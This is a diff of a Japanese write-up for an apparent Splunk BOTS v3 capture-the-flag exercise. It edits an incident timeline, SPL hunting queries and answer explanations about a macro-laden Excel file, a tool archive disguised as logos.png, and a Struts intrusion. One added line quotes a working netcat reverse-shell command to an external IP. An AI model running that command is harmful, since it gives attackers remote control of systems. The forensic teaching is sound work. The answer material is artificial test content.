@@ -22,7 +22,7 @@
 |時刻 |出来事
 
 |09:55
-|`bgist` がマクロ付き Excel を受け取り，Symantec が W97M.Empstage として検知・削除
+|`bgist` のメールに添付されたマクロ付き Excel を，Symantec が `W97M.Empstage` として検知・削除
 
 |09:57
 |OneDrive に `BRUCE BIRTHDAY HAPPY HOUR PICS.lnk` がアップロードされる
@@ -30,7 +30,7 @@
 |10:08
 |`FYODOR-L` にローカルユーザー `svcvnc` が作られる
 
-|10:42〜10:47
+|10:47
 |`FYODOR-L` に `hdoor.exe` が置かれ，`45.77.53.176:3333` から `logos.png` がダウンロードされる
 
 |11:05〜
@@ -89,7 +89,7 @@ ____
 配点：10 点
 
 .方針
-問題の「マルウェア」は，`bgist` に届いたマクロ付き Excel（W97M.Empstage）である．
+問題の「マルウェア」は，`bgist` のメールに添付されていたマクロ付き Excel（`W97M.Empstage`）である．
 このファイルの検知記録と，ファイルを作成したプロセスを Sysmon で調べる．
 
 まず，Symantec による検知を探す．
@@ -132,7 +132,7 @@ NOTE: 解答者 4 チームはいずれもこの問題を解けなかった．
 TIP: このメールの経緯は他のログでも追える．
 メールの配送記録（`ms:o365:reporting:messagetrace`）には `bgist@froth.ly` から 4 人に送られた件名「Draft Financial Plan for Brewery FY2019」があり，
 `stream:smtp` の同じメールでは，添付ファイルが「`Malware Alert Text.txt`」（Base64）に置き換えられている．
-デコードすると，添付の `Frothly-Brewery-Financial-Planning-FY2019-Draft.xlsm` が W97M.Empstage として削除された旨が書かれている．
+デコードすると，添付の `Frothly-Brewery-Financial-Planning-FY2019-Draft.xlsm` が `W97M.Empstage` として削除された旨が書かれている．
 
 WARNING: `powershell.exe`，`iexeplorer.exe`，`browser_broker.exe` などを答えて外したチームが多い．
 これらは攻撃の後段で使われたプロセスで，Excel ファイルとは直接関係しない．
@@ -350,8 +350,9 @@ index=botsv3 host=FYODOR-L sourcetype=XmlWinEventLog:Microsoft-Windows-Sysmon/Op
 | eval first=strftime(first, "%T")
 ----
 
-10:47:06 に `logos.png` を取得した約 35 秒後の 10:47:41 に，PowerShell が `C:\Windows\Temp\unziped\lsof-master\` の下に
+Sysmon で 3333 番への接続が記録された 10:47:06 の約 35 秒後（10:47:41）に，PowerShell が `C:\Windows\Temp\unziped\lsof-master\` の下に
 `iexeplorer.exe` などを作っている．
+なお `stream:http` では応答の完了時刻が記録されるため，`logos.png` の取得は 10:47:16 と表示される．
 「unziped」というフォルダー名から，画像ファイルに見せかけた `logos.png` の実体はツールを詰めたアーカイブだったと推定できる．
 
 .答え
@@ -399,6 +400,9 @@ index=botsv3 host=hoth sourcetype=osquery:results "/tmp/"
 外部から内容が流し込まれたのは `colonel` と `definitelydontinvestigatethisfile.sh` の 2 つである．
 他はサーバー上の操作で派生したファイルである．
 
+NOTE: osquery の `file_events` はまとめて記録されるため，`_time` は実際の操作より遅れることがある．
+複数のファイルが同じ時刻（11:13:57）になっているのはこのためで，2402 で示すプロセス記録の時刻（`./colonelnew` の実行は 11:17）とも前後する．
+
 攻撃者が送ったコマンドは，Struts への HTTP リクエストから読める（2403 も参照）．
 
 [source,spl]
@@ -408,6 +412,8 @@ index=botsv3 sourcetype=stream:http uri_path=/frothlyinventory/integration/saveG
 | sort 0 _time
 | table _time src_ip cmd
 ----
+
+この中の `/bin/sh 0</tmp/backpipe | nc 45.77.53.176 8088 1>/tmp/backpipe` が，`backpipe` を使って `45.77.53.176` の 8088 番へリバースシェルをつなぐコマンドである．
 
 .答え
 [%collapsible.answer]
